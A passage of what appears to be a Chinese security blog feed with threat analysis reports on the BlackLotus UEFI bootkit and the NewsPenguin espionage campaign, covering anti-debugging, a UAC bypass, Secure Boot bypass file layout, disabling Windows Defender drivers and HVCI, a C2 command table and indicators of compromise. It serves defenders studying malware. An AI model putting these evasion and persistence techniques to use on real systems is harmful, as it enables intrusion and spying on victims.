该函数用于为恶意驱动分配足够的内存。<br><img src="603ce62c/clip_image007.png"><br>         当winload.efi第一次调用该函数时, 执行恶意EFI程序hook代码, 在hook代码中判断目标内存是否是PE文件或者其他类型。如果不是PE文件则不做任何处理而是直接调用原函数。<br><img src="603ce62c/clip_image009.png"><br>         当为PE文件时, 判断subsystem是否为内核驱动或者是否为EFI应用,EFI应用还会判断是否为bootmgr.efi。如果不属于这两类则判断PE文件中是否包含资源名为bootmgr.xsl或winload.xsl的资源。<br><img src="603ce62c/clip_image011.png"><br>         在hook代码中只对包含资源名为winload.xsl或bootmgr.xsl的PE文件做了处理。函数install_MmAllocPhy_hook主要对内存分配函数进行hook, 与前面的hook代码一样。<br><img src="603ce62c/clip_image013.png"></p><h3 id="4-解密恶意驱动"><a href="#4-解密恶意驱动" class="headerlink" title="4.解密恶意驱动"></a>4.解密恶意驱动</h3><p>         恶意驱动与加密数据的硬编码形式存放在程序内, 并使用自定义的解密算法解密文件，解密后的数据被抹去了PE文件头,用于防止内存DUMP。<br><img src="603ce62c/clip_image015.png"><br>&emsp;&emsp;如果解密后的数据头两个字节为KH,则表示数据解密成功, 继续hook下一阶段要用的函数。</p><blockquote><p><strong>OslArchTransferToKernel</strong>：该阶段处于操作系统内核和一些系统驱动程序已经加载到内存但是还没执行的时刻, 是对其他内核程序或者代码进行patch的完美时机。<br><strong>BlImgAllocateImageBuffer</strong>：用于分配恶意驱动所需的内存</p></blockquote><p><img src="603ce62c/clip_image017.png"><br>&emsp;&emsp;当函数OslArchTransferToKernel执行时,首先执行的是恶意EFI应用的代码，在该函数内对内核驱动disk.sys进行挂钩, 将该文件的入口点替换成恶意驱动的入口点,在恶意驱动执行完后再执行驱动disk.sys的入口点。<br>         这样做的目的是为了在系统初始化的早期阶段执行内核驱动,避免被发现。<br><img src="603ce62c/clip_image019.png"><br>&emsp;&emsp;在遍历内核模式时顺便对两个驱动文件进行patch, 使其立即返回不执行其驱动入口代码，这两个驱动程序为WdBoot.sys和WdFilter, 分别是Windows Defender ELAM驱动程序和Windows Defender文件系统过滤程序。<br><img src="603ce62c/clip_image021.png"></p><h2 id="2-恶意驱动"><a href="#2-恶意驱动" class="headerlink" title="2.恶意驱动"></a>2.恶意驱动</h2><p>&emsp;&emsp;当操作系统内核执行驱动disk.sys的入口点函数时,已安装的hook会将其跳转到恶意驱动的入口点, 恶意驱动将HTTP下载程序注入到系统进程winlogo.exe中。</p><h3 id="1-注入http下载程序到winlogon进程"><a href="#1-注入http下载程序到winlogon进程" class="headerlink" title="1. 注入http下载程序到winlogon进程"></a>1. 注入http下载程序到winlogon进程</h3><p>&emsp;&emsp;系统启动后,恶意驱动会一直等待进程winlogon执行，然后注入恶意程序到该进程。<br><img src="603ce62c/clip_image023.png"><br>&emsp;&emsp;在不存在内核调试器的情况下,解密内嵌在驱动文件内的程序并注入到winlogon进程内,在其进程空间内通过创建线程的方式执行恶意程序。<br><img src="603ce62c/clip_image025.png">        </p><h3 id="2-检测内核调试器"><a href="#2-检测内核调试器" class="headerlink" title="2.检测内核调试器"></a>2.检测内核调试器</h3><p>&emsp;&emsp;恶意驱动查询系统属性SystemKernelDebuggerInformation来判断是否存在内核调试器,如果不存在则开始注入恶意程序到winlogon进程。<br><img src="603ce62c/clip_image027.png"></p><h3 id="3-文件保护"><a href="#3-文件保护" class="headerlink" title="3.文件保护"></a>3.文件保护</h3><p>&emsp;&emsp;为了保护位于ESP目录上的bootkit文件,内核驱动程序使用了一种比较简单的方法。<br>&emsp;&emsp;恶意驱动打开所有需要保护文件，复制并保存它们的句柄,并将HandleFlags设置为1从而保护句柄不被其他任意进程关闭, 间接达到阻止任何试图删除或者修改受保护文件的尝试。<br><img src="603ce62c/clip_image029.png"><br>&emsp;&emsp;如果受害者使用ARK等具有较高权限的工具删除了受保护的文件，恶意驱动在循环中检测文件是否存在，如果检测到了被删除则会触发蓝屏作为另一种保护。<br><img src="603ce62c/clip_image031.png"></p><h3 id="4-与HTTP下载程序通信"><a href="#4-与HTTP下载程序通信" class="headerlink" title="4.与HTTP下载程序通信"></a>4.与HTTP下载程序通信</h3><p>&emsp;&emsp;恶意驱动通过section对象的方式接收来自用户层的HTTP下载程序的命令并执行, 事件名格式为如下,<br>\BaseNamedObjects\{网卡设备mac}<br>&emsp;&emsp;位于用户层的程序将指令写入事件对象内, 恶意驱动读取该section对象获取指令并执行,恶意驱动支持的指令如下:</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>指令</td><td>描述</td></tr><tr><td>0x55(U)</td><td>卸载bootkit, 删除bootkit文件</td></tr><tr><td>0x49(I)</td><td>执行任意恶意驱动</td></tr></tbody></table><p>&emsp;&emsp;卸载bootkit时删除所有bootkit相关文件,并将winload.efi恢复源文件名Bootmgrfw.efi。<br><img src="603ce62c/clip_image033.png"><br>&emsp;&emsp;指令为I时执行任意驱动程序,包括无数字证书的内核驱动。<br><img src="603ce62c/clip_image035.png"></p><h1 id="5-ATT-amp-CK矩阵"><a href="#5-ATT-amp-CK矩阵" class="headerlink" title="5.ATT&amp;CK矩阵"></a>5.ATT&amp;CK矩阵</h1><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Tactic</td><td>ID</td><td>Name</td><td>Description</td></tr><tr><td>Resource Develpment</td><td>T1588.005</td><td>Obtain Capabilities:Exploits</td><td>利用已知漏洞绕过UEFI Secure Boot</td></tr><tr><td>Execution</td><td>T1106</td><td>Native API</td><td>使用Windows 内核 API函数</td></tr><tr><td></td><td>T1559</td><td>Inter-Process Communication</td><td>与内核层驱动通信使用section对象</td></tr><tr><td>Persistence</td><td>T1542.003</td><td>Pre-OS Boot: Bootkit</td><td>将恶意文件部署在EFI系统分区内用于可持久化执行</td></tr><tr><td>Defense Evasion</td><td>T1497.001</td><td>Virtualization/Sandbox Evasion: System Checks</td><td>检测vmware、sanbox等虚拟化软件</td></tr><tr><td></td><td>T1622</td><td>Debugger Evasion</td><td>检测调试器</td></tr><tr><td></td><td>T1014</td><td>Rootkit</td><td>恶意驱动保护bootkit文件不被删除</td></tr><tr><td></td><td>T1055.002</td><td>Process Injection: Portable Executable Injection</td><td>内核驱动注入恶意程序到进程winlogon.exe</td></tr><tr><td></td><td>T1027.009</td><td>Obfuscated Files or Information: Embedded Payloads</td><td>恶意文件使用AES加密并嵌入在文件内</td></tr><tr><td></td><td>T1027.007</td><td>Obfuscated Files or Information: Dynamic API Resolution</td><td>动态解析windows API</td></tr><tr><td></td><td>T1112</td><td>Modify Registry</td><td>修改注册表关闭HVCI功能</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.   概述&quot;&gt;&lt;/a&gt;1.   概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;在上一篇报告中已经详细分析了bootkit的安装过程, 本篇报告主要针对已经部署的bootkit进行进一步的详细分析。&lt;/p&gt;
&lt;h1 id=&quot;2-详细分析&quot;&gt;&lt;a href=&quot;#2-详细分析&quot; class=&quot;headerlink&quot; title=&quot;2.详细分析&quot;&gt;&lt;/a&gt;2.详细分析&lt;/h1&gt;&lt;h2 id=&quot;1-bootmgrfw-efi分析&quot;&gt;&lt;a href=&quot;#1-bootmgrfw-efi分析&quot; class=&quot;headerlink&quot; title=&quot;1. bootmgrfw.efi分析&quot;&gt;&lt;/a&gt;1. bootmgrfw.efi分析&lt;/h2&gt;&lt;p&gt;         BlackLotus使用自签名的恶意EFI应用替换了原文件bootmgrfw.efi,将源文件重命名为winload.efi, 替换后的执行流程如下图:&lt;br&gt; &lt;img src=&quot;/post/603ce62c/clip_image001.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="APT分析报告" scheme="http://shxi.cc/categories/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
    
    <category term="BlackLotus" scheme="http://shxi.cc/tags/BlackLotus/"/>
    
  </entry>
  
  <entry>
    <title>BlackLotus 首个绕过安全启动的UEFI bootkit(上)</title>
    <link href="http://shxi.cc/post/7927d76d.html"/>
    <id>http://shxi.cc/post/7927d76d.html</id>
    <published>2023-03-10T02:43:41.000Z</published>
    <updated>2023-10-17T06:59:37.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.   概述"></a>1.   概述</h1><p>&emsp;&emsp;UEFI bootkit部署在系统固件中，能够完全控制操作系统的启动过程，因此可以禁用操作系统级别的安全机制并在启动期间中以最高权限执行程序。<br>&emsp;&emsp;BlackLotus利用一个漏洞编号为CVE-2022-21894的安全漏洞来绕过UEFI安全启动保护并设置持久性。<br>利用该漏洞可以在操作系统的早期启动阶段执行任意代码从而允许攻击者在开启UEFI安全启动的系统上执行恶意操作而无需物理访问。</p><h1 id="2-流程图"><a href="#2-流程图" class="headerlink" title="2.流程图"></a>2.流程图</h1> <img src="/post/7927d76d/clip_image001.png" class="" title="example"><span id="more"></span><h1 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2.详细分析"></a>2.详细分析</h1><h2 id="1-反调试"><a href="#1-反调试" class="headerlink" title="1. 反调试"></a>1. 反调试</h2><p>&emsp;&emsp;恶意程序使用了多种反调试、反虚拟机技术来绕过安全软件的查杀和安全研究人员的分析, 并在多个函数内存在多处暗桩代码检测。<br>&emsp;&emsp;当检测到调试器时执行无效指令使自身因异常而退出程序。</p><p><strong>1.</strong>     设置ThreadHideFromDebugger隐藏来自调试器的调试事件,使其无法接收到调试事件从而无法调试导致卡死。</p><p><img src="7927d76d/clip_image003.png"></p><p><strong>2.</strong>     检测PEB结构的字段BeingDebugged是否为0来检测是否为调试器。<br><img src="7927d76d/clip_image005.png"></p><p><strong>3.</strong>     检测PEB结构的字段NtGlobalFlag是否为0x70, 因为在调试状态下,某些Flag必定会被设置。<br><img src="7927d76d/clip_image007.png"></p><p><strong>4.</strong>     检测进程信息来判断进程是否被调试。<br><img src="7927d76d/clip_image009.png" alt=" "></p><p><strong>5.</strong>     检测是否存在内核调试器<br><img src="7927d76d/clip_image011.png"></p><p><strong>6.</strong>     设置异常处理函数并且执行int指令触发异常, 如果异常被调试器接管则不会执行异常处理函数。</p><p><img src="7927d76d/clip_image013.png" alt=" "></p><p>         如果异常处理函数被执行,则表示该进程没有被调试器调试.</p><p><img src="7927d76d/clip_image015.png" alt=" "></p><p><strong>7.</strong>     检测该进程是否加载了指定的模块, 由于是硬编码的哈希值, 没法反推出加载的模块名</p><p><img src="7927d76d/clip_image017.png"></p><p><strong>8.</strong>     遍历当前系统所有运行的进程并判断是否与硬编码的哈希值匹配，可能是查找调试器、安全软件相关的进程。</p><p><img src="7927d76d/clip_image029.png" alt=" "></p><p><strong>9.</strong>     利用RSTDC指令检测指令执行间隔</p><p><img src="7927d76d/clip_image021.png"></p><h2 id="2-反虚拟机"><a href="#2-反虚拟机" class="headerlink" title="2. 反虚拟机"></a>2. 反虚拟机</h2><p><strong>1.</strong>     查询如下注册表相关项是否存在来检测是否运行在虚拟机环境下。</p><p><img src="7927d76d/clip_image023.png"></p><p><strong>2.</strong>     判断如下注册表对应的键值是否为VMWare、QEMU和Vbox来检测虚拟机。</p><p><img src="7927d76d/clip_image025.png"></p><p><strong>3.</strong>     判断系统固件信息是否qemu、VBOX和VMWare等来判断是否为虚拟机。</p><p><img src="7927d76d/clip_image027.png"></p><p><strong>4.</strong>     判断系统的ACPI信息中是否包含bochs、bxpc和vmware来检测虚拟机。</p><p><img src="7927d76d/clip_image029.png" alt=" "></p><p><strong>5.</strong>     从注册表中获取网卡的ServiceName,然后通过发送控制码0x170002获取网卡的mac地址并将其与硬编码的数据比较来检测虚拟机。</p><p><img src="7927d76d/clip_image031.png" alt=" "></p><h2 id="3-UAC-Bypass"><a href="#3-UAC-Bypass" class="headerlink" title="3. UAC Bypass"></a>3. UAC Bypass</h2><p>&emsp;&emsp;当没有检测到调试器或者虚拟机环境后, 恶意程序需要检查自身是否由足够的权限(至少是管理员权限)来释放bootkit文件到ESP目录或者执行其他需要较高权限的操作, 比如关闭HVCI功能等等。<br>&emsp;&emsp;恶意程序通过获取当前进程的Token来判断是否已经有管理员权限，如果没有则通过UAC Bypass的方式进行提权。</p><p><img src="7927d76d/clip_image033.png"></p><p>&emsp;&emsp;恶意程序主要通过使用程序兼容性助手来实现UAC bypass,实现原理如下:<br>1.     伪造pcadm.dll文件<br>2.     伪造环境变量windir<br>3.     确保PcaSvc服务已经启动<br>4.     通过某种手段触发事件, 事件触发时会加载伪造的pcadm.dll。<br>5.     在伪造的pcadm.dll文件创建进程来执行UAC bypass。</p><p>&emsp;&emsp;pcadm.dll从伪造的环境变量中读取恶意程序的完整路径，由于该文件是由PcaSvc服务加载的模块，因此具有较高的权限,同样创建的进程也继承该服务的权限。</p><p><img src="7927d76d/clip_image035.png"></p><h2 id="4-Bootkit部署"><a href="#4-Bootkit部署" class="headerlink" title="4. Bootkit部署"></a>4. Bootkit部署</h2><p>&emsp;&emsp;在开始释放bootkit文件之前首先判断SecureBoot是否已经开启。恶意程序使用两种方法来判断:<br><strong>1.</strong>     通过系统版本号来判断, 原因时SecureBoot是在win8(6.2)以后的操作系统新增的功能<br><strong>2.</strong>     读取系统环境变量SecureBoot来读取该功能是否已经开启。</p><p><img src="7927d76d/clip_image037.png"></p><p>&emsp;&emsp;恶意程序会根据SecureBoot功能是否开启来部署不同的bootkit文件。如果受害者机器处于没有开启SecureBoot功能或者该功能被禁用的情况下，部署bootkit比较简单, 只需要使用自己的自签名的恶意UEFI应用替换ESP目录中的windows启动管理器(bootmgfw.efi)。<br>&emsp;&emsp;恶意程序在开启SecureBoot的情况下会释放以下几个文件到指定目录，等待所有文件都部署完毕后等待60秒后重启系统, 重启后首先加载的为恶意文件grubx64.efi。</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>目录</strong></td><td><strong>文件</strong></td><td><strong>描述</strong></td></tr><tr><td>ESP:\EFI\Microsoft\boot</td><td>grubx64.efi</td><td>自签名的恶意UEFI应用</td></tr><tr><td>bootload.efi</td><td>有微软数字证书的合法应用</td><td></td></tr><tr><td>bootmgfw.efi</td><td>有微软数字证书的合法应用</td><td></td></tr><tr><td>BCD</td><td>攻击者自定义的BCD启动配置</td><td></td></tr><tr><td>BCDR</td><td>受害者的BCD启动配置的备份</td><td></td></tr><tr><td>ESP:\system32</td><td>hvloader.efi</td><td>有微软数字证书的合法应用</td></tr><tr><td>bootmgr.efi</td><td>有微软数字证书的合法应用</td><td></td></tr><tr><td>mcupdate_AuthenticAMD.dll</td><td>自签名的恶意程序, 用于CVE-2022-21894漏洞利用</td><td></td></tr><tr><td>mcupdate_GenuineIntel.dll</td><td>自签名的恶意程序, 用于CVE-2022-21894漏洞利用</td><td></td></tr><tr><td>BCD</td><td>攻击者自定义的BCD启动配置</td><td></td></tr></tbody></table><h2 id="5-关闭虚拟机监控程序保护的代码完整性-HVCI"><a href="#5-关闭虚拟机监控程序保护的代码完整性-HVCI" class="headerlink" title="5. 关闭虚拟机监控程序保护的代码完整性(HVCI)"></a>5. 关闭虚拟机监控程序保护的代码完整性(HVCI)</h2><p>&emsp;&emsp;为了能够在安装bootkit后执行任意的未签名内核代码,恶意程序需要将HVCI功能给关闭。<br>&emsp;&emsp;HVCI在内核中会检测执行代码是否被修改过并且只允许执行已签名的代码，这样能够有效的防止易受攻击的内核驱动被滥用来执行未签名的内核代码或者加载恶意内核驱动，禁用方法如下图:</p><p><img src="7927d76d/clip_image039.png"></p><h2 id="6-显示虚假窗口"><a href="#6-显示虚假窗口" class="headerlink" title="6. 显示虚假窗口"></a>6. 显示虚假窗口</h2><p>&emsp;&emsp;在释放bootkit相关文件为了避免由于受害者关闭机器等其他操作导致的释放文件失败,恶意程序伪装了一个提示窗口, 提示受害者不要重启机器。</p><p><img src="7927d76d/clip_image041.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.   概述&quot;&gt;&lt;/a&gt;1.   概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;UEFI bootkit部署在系统固件中，能够完全控制操作系统的启动过程，因此可以禁用操作系统级别的安全机制并在启动期间中以最高权限执行程序。&lt;br&gt;&amp;emsp;&amp;emsp;BlackLotus利用一个漏洞编号为CVE-2022-21894的安全漏洞来绕过UEFI安全启动保护并设置持久性。&lt;br&gt;利用该漏洞可以在操作系统的早期启动阶段执行任意代码从而允许攻击者在开启UEFI安全启动的系统上执行恶意操作而无需物理访问。&lt;/p&gt;
&lt;h1 id=&quot;2-流程图&quot;&gt;&lt;a href=&quot;#2-流程图&quot; class=&quot;headerlink&quot; title=&quot;2.流程图&quot;&gt;&lt;/a&gt;2.流程图&lt;/h1&gt; &lt;img src=&quot;/post/7927d76d/clip_image001.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    <category term="APT分析报告" scheme="http://shxi.cc/categories/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
    
    <category term="BlackLotus" scheme="http://shxi.cc/tags/BlackLotus/"/>
    
  </entry>
  
  <entry>
    <title>新组织NewsPenguin 使用高级间谍程序针对巴基斯坦组织</title>
    <link href="http://shxi.cc/post/aa66881.html"/>
    <id>http://shxi.cc/post/aa66881.html</id>
    <published>2023-02-17T07:34:52.000Z</published>
    <updated>2023-10-18T07:48:35.654Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h1><p>&emsp;&emsp;最近有安全研究人员发现以前未被发现的APT组织正在滥用即将举行的巴基斯坦国际海事博览会和会议(PIMEC-2023)作为主题来对巴基斯坦组织进行鱼叉式钓鱼。<br>&emsp;&emsp;攻击者给受害者发送一封主题为PIMEC-23参展商的文档，该文档利用远程模板注入漏洞从服务器加载包含恶意宏代码的模板并执行。<br>&emsp;&emsp;最终投递到受害者机器上的payload时一种高级间谍工具,由于该工具使用”Penguin”作为xor密钥对数据进行加密解密,<br>&emsp;&emsp;在网络请求头部包含”getlatestnews”字段, 因此将这个APT组织称为”NewsPenguin”。</p><h1 id="2-流程图"><a href="#2-流程图" class="headerlink" title="2.流程图"></a>2.流程图</h1><img src="/post/aa66881/fef58f82dfa576b0f88d947503382451.png" class="" title="example"><span id="more"></span><h1 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h1><h2 id="1-钓鱼文档分析"><a href="#1-钓鱼文档分析" class="headerlink" title="1.钓鱼文档分析"></a>1.钓鱼文档分析</h2><p>&emsp;&emsp;钓鱼文档主题为”exhibitor manual”(参展商手册)，主要针对即将来参展的访客。</p><p>&emsp;&emsp;在第一页内嵌了一张图片,用于提示受害者点击<strong>启用内容</strong>按钮以便远程模板能够执行恶意宏代码。从第二页开始文档的字体颜色被设置为白色, 结合第一页的提示图提高迷惑性。<br><img src="aa66881/31c969fa4ea26f82f699cba2187940ef.png"></p><p>&emsp;&emsp;在此次攻击中, 攻击者使用的模板地址如下, 为RTF文件格式, 域名IP地址为51.222.103.8,经过测试只有当受害者的IP在巴基斯坦时才会返回模板文件。<br><img src="aa66881/4d31443e8297d392e5ab4ecaec5a3210.png"></p><p>&emsp;&emsp;模板成功加载后,开始执行模板中的恶意宏代码函数AutoOpen。首先删除启用内容提示图和将字体颜色从白色改为黑色。<br><img src="aa66881/ed3877d136cf8d31e2f643a528aaf58c.png"></p><p>&emsp;&emsp;去掉启用提示图和修改字体颜色后文档显示如下:<br><img src="aa66881/7776cba309d3551a0a45f90c725f0492.png"></p><p>在远程加载模板时,模板文件在不同操作系统中保存的位置不一样，在win10中保存的目录为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%appdata%\Local\Microsoft\Windows\INetCache\IE</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在win7中保存的位置为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%appdata%\Local\Microsoft\Windows\Temporary Internet Files</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据指定路径是否存在和程序”curl.exe”是否存在来确定模板文件保存的位置和指定payload下载方式。<br><img src="aa66881/f4fe46323f07ea2fd9c2d075830d708d.png"></p><p>&emsp;&emsp;递归遍历模板文件下载缓存目录,找到所有后缀名为”docx”的文件。<br><img src="aa66881/cb0e03fd35696286101a08a62967392a.png"></p><p>&emsp;&emsp;攻击者在模板文件中嵌入了两个WSF脚本,如果在模板文件下载缓存目录中找到的文档包含WSF脚本则可能是攻击者使用的模板文件。<br>&emsp;&emsp;将模板文件使用type命令重写到文件”C:\Windows\Tasks\abc.wsf ”,创建注册表启动项, 启动项为”WindowsBoost”，值为执行wsf脚本的命令行。</p><p><img src="aa66881/d383f77b28e04d3523343378cb99ab0c.png"></p><p>&emsp;&emsp;内嵌在RTF内WSF脚本如下图,如果受害者操作系统是Win10则调用程序curl下载批处理文件”winint.bat”;如果是win7则执行powershell脚本下载文件”winint.crt”,winint.crt实际上为base64编码后的winint.bat。<br><img src="aa66881/8679f37886ce767e4b9aa8dd9091e5e5.png"></p><p>&emsp;&emsp;winint.bat批处理文件如下, 从服务器下载5个文件, 其中smss和Taskhostw为同一文件。<br><img src="aa66881/67fc0e25b18961bf162fea170a5eeb7b.png"></p><h2 id="2-间谍木马分析"><a href="#2-间谍木马分析" class="headerlink" title="2.间谍木马分析"></a>2.间谍木马分析</h2><h3 id="1-解密"><a href="#1-解密" class="headerlink" title="1.解密"></a>1.解密</h3><p>&emsp;&emsp;程序”Taskhostw.exe”的原始文件名为”gup.exe”,是程序”Notepad++”的合法组件,具有有效的数字签名。<br><img src="aa66881/914e95b7495903e5553deddbdbee833c.png"></p><p>&emsp;&emsp;攻击者利用侧加载技术使合法组件加载被修改的恶意文件<strong>libcurl.dll</strong>,libcurl.dll使用”penguin”作为异或密钥解密文件”updates”,解密完后注入到系统进程”C:\Windows\syswow64\explorer.exe”。</p><h3 id="2-沙箱绕过"><a href="#2-沙箱绕过" class="headerlink" title="2.沙箱绕过"></a>2.沙箱绕过</h3><p>&emsp;&emsp;恶意程序执行多种检测用于判断自身是否在沙箱中执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.  使用GetTickCount来识别绕过具有睡眠功能的沙盒</span><br><span class="line">2.  检查硬盘驱动器大小是否超过10GB</span><br><span class="line">3.  检查物理内存大小</span><br></pre></td></tr></table></figure><p>沙箱绕过代码如下:<br><img src="aa66881/af33eac88cc8d7b7af853f589463d724.png"></p><h3 id="3-创建互斥量"><a href="#3-创建互斥量" class="headerlink" title="3.创建互斥量"></a>3.创建互斥量</h3><p>&emsp;&emsp;创建名为”Windows.20H2.85685475”的互斥量避免创建多个相同实例。<br><img src="aa66881/00a18deddde93bf324132d3c32d2efb2.png"></p><h3 id="3-C-amp-C上线包"><a href="#3-C-amp-C上线包" class="headerlink" title="3.C&amp;C上线包"></a>3.C&amp;C上线包</h3><p>&emsp;&emsp;恶意程序第一次与C&amp;C服务器进行连接时, 会生成一个标识符用于标记受害者,该标识符生成算法如下图,首先将电脑名和用户名拼接成一个新的字符串后将该字符串的每一个字符都加1然后使用base64编码数据。<br><img src="aa66881/e5d743fcc58c5ac09c26284ce9a3fd1c.png"></p><p>&emsp;&emsp;发送的请求如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host:updates.win32.live</span><br><span class="line">szAgent:Chrome/97.0.1072.62</span><br><span class="line">Content-Type: text/plain; charset=utf-8 \r</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><h3 id="3-C-amp-C指令"><a href="#3-C-amp-C指令" class="headerlink" title="3.C&amp;C指令"></a>3.C&amp;C指令</h3><p>&emsp;&emsp;恶意程序从C&amp;C服务器接收base64编码后的C&amp;C指令并执行,如果C&amp;C服务器失效，则恶意程序则会尝试重连,如果重连次数超过5次则会等待5分钟后再次尝试进行连接，重连次数超过10次则会退出进程。下表是恶意程序使用的所有C&amp;C指令。</p><table><thead><tr><th>C&amp;C指令</th><th>描述</th></tr></thead><tbody><tr><td>sh who</td><td>用户名</td></tr><tr><td>sh dir</td><td>获取指定目录下的所有文件的文件信息,包含文件创建时间、文件访问时间、文件修改时间、文件大小和文件名</td></tr><tr><td>sh spawn</td><td>创建一个新的线程,在线程中执行程序c:\programdata\vpskg.exe</td></tr><tr><td>sh tasklist</td><td>获取正在允许的所有进程的进程信息,包括进程名、进程ID和会话ID。</td></tr><tr><td>sh hostname</td><td>获取电脑名</td></tr><tr><td>sh cp</td><td>拷贝文件</td></tr><tr><td>sh del</td><td>删除文件</td></tr><tr><td>sh mkd</td><td>创建目录</td></tr><tr><td>sh mv</td><td>移动文件</td></tr><tr><td>sh spdel</td><td>结束自身进程</td></tr><tr><td>sh type</td><td>写文件</td></tr><tr><td>sh runpe</td><td>执行PE文件,并将执行结果写入文件”c:\programdata\63921eef-8415-4368-9201-f0df4af5778f.devm”</td></tr><tr><td>exit</td><td></td></tr><tr><td>sh ufi</td><td>上传文件到C&amp;C服务器</td></tr><tr><td>sh dfi</td><td>从C&amp;C服务器下载文件</td></tr><tr><td>sh pid</td><td>获取当前进程的PID</td></tr><tr><td>0xSL33P</td><td>设置获取C&amp;C指令失败后的等待时间并返回两种类型的等待时间</td></tr><tr><td>0xSL33Q</td><td>设置恶意程序连接C&amp;C服务器失败后每一次重连的间隔时间并返回两种类型的等待时间</td></tr><tr><td>0xSL33S</td><td>返回两种类型的等待时间</td></tr></tbody></table><h1 id="4-IOC"><a href="#4-IOC" class="headerlink" title="4.IOC"></a>4.IOC</h1><p>Windows.20H2.85685475<br>185.198.59.109<br>updates.win32.live<br>hxxp://windowsupdates.shop/test.dotx<br>861B80A75ECFB083C46F6E52277B69A9<br>8B0BF3F5F0AC4605C8C5EF73EB121757<br>314328E63B2E55A9C20BBDA313AB4D04<br>C219A8C50624F9DD9FC0F3C32510EA77<br>1cb100825912dd70c3a8f8e11fadc97f<br>5abd9f1828e3c6d899b9c8ba79c16473<br>fcae6b88640b58d289df42ae2d15e3ca<br>BFEC9148F90D1565AE334302D79B890964DD4C89</p><h1 id="5-ATT-amp-CK矩阵"><a href="#5-ATT-amp-CK矩阵" class="headerlink" title="5.ATT&amp;CK矩阵"></a>5.ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Initial Access</td><td>T1566.001</td><td>Spearphishing Attachment</td><td>鱼叉式网络钓鱼</td></tr><tr><td>Execution</td><td>T1059.001</td><td>Command and Scripting Interpreter</td><td>执行powershell命令</td></tr><tr><td></td><td>T1559.001</td><td>Component Object Model</td><td>文档使用远程模板注入</td></tr><tr><td></td><td>T1059.005</td><td>Visual Basic</td><td>文档恶意宏代码</td></tr><tr><td></td><td>T1059.003</td><td>Windows Command Shell</td><td>使用cmd命令行</td></tr><tr><td></td><td>T1204.002</td><td>User Execution</td><td>恶意文档诱导执行</td></tr><tr><td></td><td>T1203</td><td>Exploitation for Client Execution</td><td>利用office的远程模板注入漏洞</td></tr><tr><td>Privilege Escalation</td><td>T1055.002</td><td>Portable Executable Injection</td><td>注入到系统进程</td></tr><tr><td>Defense Evasion</td><td>T1480</td><td>Execution Guardrails</td><td>满足特定条件才会被执行</td></tr><tr><td></td><td>T1221</td><td>Template Injection</td><td>Office利用远程模板注入</td></tr><tr><td></td><td>T1027</td><td>Obfuscated Files or Information</td><td>混淆文件数据</td></tr><tr><td></td><td>T1140</td><td>Deobfuscate/Decode Files or Information</td><td>使用文件时需要先解密</td></tr><tr><td>Command-and-Control</td><td>T1105</td><td>Ingress Tool Transfer</td><td>下载恶意程序</td></tr><tr><td></td><td>T1132.001</td><td>Data Encoding:Data Encoding</td><td>使用标准方法编码通信数据</td></tr><tr><td></td><td>T1071.001</td><td>Application Layer Protocol:Web Protocols</td><td>使用http协议通信</td></tr><tr><td></td><td>T1573.001</td><td>Encrypted Channel:Encrypted Channel</td><td>通信流量使用对称加密</td></tr><tr><td>Exfiltration</td><td>T1041</td><td>Exfiltration Over C2 Channel</td><td>利用C&amp;C泄露数据</td></tr><tr><td></td><td>T1029</td><td>Scheduled Transfer</td><td>定时回传数据</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;最近有安全研究人员发现以前未被发现的APT组织正在滥用即将举行的巴基斯坦国际海事博览会和会议(PIMEC-2023)作为主题来对巴基斯坦组织进行鱼叉式钓鱼。&lt;br&gt;&amp;emsp;&amp;emsp;攻击者给受害者发送一封主题为PIMEC-23参展商的文档，该文档利用远程模板注入漏洞从服务器加载包含恶意宏代码的模板并执行。&lt;br&gt;&amp;emsp;&amp;emsp;最终投递到受害者机器上的payload时一种高级间谍工具,由于该工具使用”Penguin”作为xor密钥对数据进行加密解密,&lt;br&gt;&amp;emsp;&amp;emsp;在网络请求头部包含”getlatestnews”字段, 因此将这个APT组织称为”NewsPenguin”。&lt;/p&gt;
